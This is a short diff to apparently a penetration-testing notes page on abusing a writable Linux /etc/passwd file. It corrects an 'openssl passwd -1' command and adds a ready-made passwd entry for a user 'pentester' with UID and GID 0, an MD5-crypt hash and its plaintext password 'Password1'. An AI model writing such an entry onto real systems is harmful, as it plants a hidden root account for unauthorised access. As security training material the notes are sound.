@@ -202,8 +202,10 @@ Instead of 1021, we got UID and GID 0, which corresponds to root account. So use
 
 Additionally one may generate a password hash with crypt function and add it the second position instead of x. 
 
-`opensll passwd -1`
+`openssl passwd -1`
 
+<code> pentester:$1$2AL4ULeB$vPb2hnoy5xgsBueJSXTsj0:0:0::/:/bin/bash </code>
+Password1
 
 # Shadow file hash cracking/adding
 
